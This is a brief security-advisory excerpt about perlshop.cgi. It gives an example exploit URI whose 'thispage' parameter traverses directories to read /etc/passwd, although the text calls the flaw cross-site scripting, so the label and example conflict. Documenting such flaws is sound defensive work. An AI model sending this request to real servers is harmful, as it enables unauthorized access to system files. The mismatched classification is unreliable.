Attackers can exploit the cross-site scripting issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URI is available:

http://www.example.cgi/cgi-bin/perlshop.cgi?ACTION=ENTER%20SHOP&amp;thispage=../../../../../../../../etc/passwd&amp;ORDER_ID=%21ORDERID%21&amp;LANG=english&amp;CUR=dollar
